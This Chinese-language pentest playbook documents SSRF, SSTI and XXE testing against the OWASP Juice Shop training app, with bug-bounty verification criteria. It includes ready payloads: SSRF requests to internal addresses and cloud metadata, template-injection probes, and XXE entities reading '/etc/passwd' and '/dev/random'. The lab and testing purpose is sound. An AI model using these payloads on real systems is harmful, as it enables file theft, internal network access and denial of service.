---
name: ssrf-ssti
category: ssrf-ssti
source: 渗透/juice-shop-closeout/patterns/ssrf-ssti.md
verified_in: [juice-shop-073-ssrf, juice-shop-074-ssti]
src_value: high
severity_ceiling: high
requires_auth: true
payload_count: 2
---

# SSRF + SSTI 验证剧本

> 来源：OWASP Juice Shop 实战。两个陷阱（urlencoded 注册顺序、SSTI 语法探测）为靶场实战发现。
> **实测记录（2026-08-23, Juice Shop 20.1.1）**：SSRF——`POST /profile/image/url`（urlencoded）触发服务端请求攻击者可控 URL（本地监听器收到 `GET /proof.txt`）✅；SSTI——用户名 `#{7*7}` 在 `/profile` 页面回显 49 ✅。

## 0. 靶场实测要点（先读）

- **认证必须用 Cookie 会话**：`security.authenticatedUsers.get(req.cookies.token)` 只认 Cookie，`Authorization` header 不够。触发方式：先带 `Authorization: Bearer <token>` 访问任意页面让全局中间件种 cookie，失败则**手动带 `Cookie: token=<jwt>`** 直接请求
- **`Blocked illegal activity` 是认证错误不是 WAF**：看到此错误先检查 cookie 会话，别误判为防护拦截
- **SSRF 端点无 URL 过滤**：`fetch(url)` 直连——用本地监听器（`python3 -m http.server 9001`）证明出网，比打内网地址更干净
- **SSTI 验证链**：`POST /profile`（JSON body `{"username":"#{7*7}"}`）→ `GET /profile` 页面回显 49。注意同一端点先检查 SSTI 再检查 SSRF（服务端检查顺序）
- **挑战解锁需要精确 solve key**：`/solve/challenges/server-side?key=<实际key>`，key 从挑战定义中取，不能猜
- **XXE DoS 用 /dev/random 外部实体**（2026-08-23 实测）：libxml2 实体展开有 amplification 防护（~10MB 上限、billion laughs 全被拦），`<!ENTITY xxe SYSTEM "file:///dev/random">` 让解析器读取无限流 → vm 2s 超时 → 服务端 503 + 挑战解锁，服务不卡死
- **XXE 文件泄露**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">` 展开后响应体（410 错误页）直接回显文件内容

## 1. 识别

### SSRF
- 找「通过 URL 加载/抓取」类功能：头像 URL 上传、图片代理、PDF 生成、Webhook 回调、抓取预览
- 测试端点往往接受 `imageUrl` / `url` / `callback` 参数

### SSTI
- 找「模板渲染用户输入」类功能：用户名/昵称显示、导出文件名、邮件模板、错误页
- 先做无破坏探测：`#{7*7}`、`{{7*7}}`、`${7*7}`、`<%= 7*7 %>`，看是否回显 49

## 2. Payload 序列

```bash
# SSRF — 注意 Content-Type 陷阱！
# ⚠️ 靶场实战发现：某些路由的 JSON parser 注册在表单解析器之后，
#    用 application/x-www-form-urlencoded 提交才能命中处理函数。
POST /profile/image/url
Content-Type: application/x-www-form-urlencoded
Cookie: token=xxx

imageUrl=http://127.0.0.1:3000/internal/admin
```

```json
// SSTI — JSON 提交
POST /profile
Content-Type: application/json
Authorization: Bearer ***

{"username": "#{7*7}"}
// 注册后访问 profile 页面，若显示 49 则模板引擎执行了表达式
```

### 陷阱清单（靶场实战）

| 陷阱 | 说明 |
|------|------|
| urlencoded vs JSON | 路由注册顺序决定哪种 Content-Type 生效，两种都试 |
| SSTI 语法 | 不同引擎语法不同：`#{...}`(Handlebars) / `{{...}}`(Jinja2/Twig) / `${...}`(Freemarker) |
| 服务端检查顺序 | 同一端点可能先检查 A 再检查 B（靶场：SSTI 先于 SSRF） |

## 3. 判定标准

### SSRF confirmed：
- [ ] 目标服务器主动连接了攻击者可控地址（DNS 回连 / 本地端口探测响应）
- [ ] 或通过 URL 读取到内网/本地资源内容（如 `/etc/passwd`、云元数据 `169.254.169.254`）

### SSTI confirmed：
- [ ] 注入表达式被求值并回显结果（`7*7` → 49）
- [ ] 至少验证两种不同表达式（排除巧合回显）

## 4. 证据要求

按 `evidence-record.md`：
- SSRF：完整请求 + 回连证据（自建监听器日志 / DNS 解析记录）+ 内网响应摘录
- SSTI：注入 payload 原文 + 回显结果摘录（页面片段）

## 5. SRC 适用边界

- 适用：有 URL 抓取功能的应用（SSRF）；渲染用户输入的模板（SSTI）
- 不适用：纯静态站点、无用户输入渲染的 SPA
- ⚠️ 敏感操作：SSRF 探测内网时只做最小验证（DNS 回连优先，避免大规模端口扫描）；云元数据读取即为高严重度，但测试时只读一个关键字段即可
